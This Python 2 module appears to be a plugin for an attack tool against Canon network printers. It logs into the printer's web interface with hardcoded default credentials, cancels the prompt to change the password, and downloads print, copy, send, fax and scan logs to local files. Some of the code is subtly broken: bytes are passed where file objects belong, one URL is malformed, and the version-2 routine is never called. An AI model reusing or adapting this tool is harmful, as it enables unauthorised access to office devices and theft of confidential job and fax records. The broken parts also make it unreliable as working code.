# -*- coding:utf-8 -*-
# author : stalker_
# 05-04-17

import beastie
from utils import print_msg
import requests
import re
import time
import os
import shutil


class Canon(beastie.BasePrinter):
    HEADER = [
        {
            'Accept-Encoding': 'deflate, sdch',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)'
        },
        {
            'Accept-Encoding': 'gzip, deflate, sdch',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
            'Upgrade-Insecure-Requests': '1'
        },
        {
            'Accept-Encoding': 'deflate',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)'
        }
    ]

    def __init__(self, ip, port, den):
        beastie.BasePrinter.__init__(self, ip, port, den)
        self.pics_dir = []
        self.box_name = []
        self.base_addr = self.ip + ':' + str(self.port)
        self.version = 1

    def req_session(self):
        url = "http://" + self.base_addr + '/'
        session = requests.Session()
        try:
            res = session.get(url).content
        except Exception, e:
            print_msg(e)
            raise e

        res_meta = re.findall("<META http-equiv=Refresh content=\"0; URL=http://(.*?)/rps/\">", res)
        if len(res_meta) > 0:
            print_msg("redirect to http://" + res_meta[0] + "/rps/")
            self.base_addr = res_meta[0]
            try:
                res = session.get("http://" + self.base_addr + '/rps', headers=self.HEADER[0]).content
            except Exception, e:
                print_msg(e)
                raise e

        if 'name="login" action="/login" method="post"' in res:
            print_msg("Needs Login.")

            try:
                res = session.post('http://' + self.base_addr + '/login', data={
                    "user_type_generic": "true",
                    "deptid": "7654321",
                    "password": "7654321",
                    "uri": "\%2Frps\%2F"
                }, headers=self.HEADER[2]).content
            except Exception, e:
                print_msg(e)
                raise e

            if 'name="login" action="/login" method="post"' in res:
                raise beastie.LoginError
            if 'document.sdl.conf.value = "no"' in res:
                print_msg("Change password, Cancel.")
                try:
                    res = session.post('http://' + self.base_addr + '/PwdConfirm', {
                        "conf": "no"
                    }, headers=self.HEADER[2])
                except Exception, e:
                    print_msg(e)
                    raise e
        elif 'name="loginFrm" action="/checkLogin.cgi" autocomplete="off" method="post"' in res:
            try:
                res = session.post('http://' + self.base_addr + '/checkLogin.cgi',
                                   "iToken=&i0012=1&i0014=7654321&i0016=7654321&i0019=").content
            except Exception, e:
                print_msg(e)
                raise e
        if "this.copyright" in res:
            print_msg("version 2.")
            self.version = 2
        else:
            print_msg("version 1.")

    @staticmethod
    def time_stamp():
        return str(int(time.time())) + '000'

    def download_logs(self):
        res = requests.get("http://" + self.base_addr + "/jlp.cgi?Flag=Html_Data&LogType=0&Dummy=" + self.time_stamp())
        if "/media/ms_err/gif" in res:
            uurs = ['jpl.html', 'jcl.html', 'jsl.html', 'jlr.html', 'jfl.html', 'jrl.html']
            for uur in uurs:
                with open(os.path.join(self.den, uur), 'wb') as fp:
                    shutil.copyfileobj(requests.get(
                        "http://" + self.base_addr + ".cgi?Dummy=" + self.time_stamp(),
                        headers=self.HEADER[0]
                    ).content, fp)
        else:
            for log_type in range(7):
                with open(os.path.join(self.den, 'Print&Copy_' + str(log_type) + '.html'), 'wb') as fp:
                    shutil.copyfileobj(requests.get("http://" + self.base_addr +
                                                    "/jlp.cgi?Flag=Html_Data&LogType=" +
                                                    str(log_type) + "&Dummy=" +
                                                    self.time_stamp(),
                                                    headers=self.HEADER[0]
                                                    ).content, fp)

    def download_logs_v2(self):
        for log_type in range(6):
            with open(os.path.join(self.den, 'Print&Copy_' + str(log_type) + '.html'), 'wb') as fp:
                shutil.copyfileobj(requests.get("http://" + self.base_addr +
                                                "/rps/jlp.cgi?Flag=Html_Data&LogType=" +
                                                str(log_type) + "&Dummy=" +
                                                self.time_stamp(), headers=self.HEADER[0]).content, fp)

        with open(os.path.join(self.den, 'Send.html'), 'wb') as fp:
            shutil.copyfileobj(requests.get("http://" + self.base_addr +
                                            "/rps/jls.cgi?Flag=Html_Data&CorePGTAG=4&Dummy=" +
                                            self.time_stamp()).content, fp)

        with open(os.path.join(self.den, 'SendFax.html'), 'wb') as fp:
            shutil.copyfileobj(requests.get("http://" + self.base_addr +
                                            "/rps/jlf.cgi?Flag=Html_Data&LogType=TX&Dummy=" +
                                            self.time_stamp()).content, fp)

        with open(os.path.join(self.den, 'ReceiveFax.html'), 'wb') as fp:
            shutil.copyfileobj(requests.get("http://" + self.base_addr +
                                            "/rps/jlf.cgi?Flag=Html_Data&LogType=RX&Dummy=" +
                                            self.time_stamp()).content, fp)

        with open(os.path.join(self.den, 'Receive.html'), 'wb') as fp:
            shutil.copyfileobj(requests.get("http://" + self.base_addr +
                                            "/rps/jlr.cgi?Flag=Html_Data&CorePGTAG=6&Dummy=" +
                                            self.time_stamp()), fp)

        with open(os.path.join(self.den, 'Save.html'), 'wb') as fp:
            shutil.copyfileobj(requests.get("http://" + self.base_addr +
                                            "/rps/jlsv.cgi?Flag=Html_Data&CorePGTAG=8&Dummy=" +
                                            self.time_stamp()), fp)

    def req_box_name_list(self):
        pass

    def execute(self):
        try:
            self.req_session()
        except Exception, e:
            print_msg(e)
            raise e

        if self.version == 1:
            print_msg("On version 1.")
            self.download_logs()
            self.req_box_name_list()
        pass

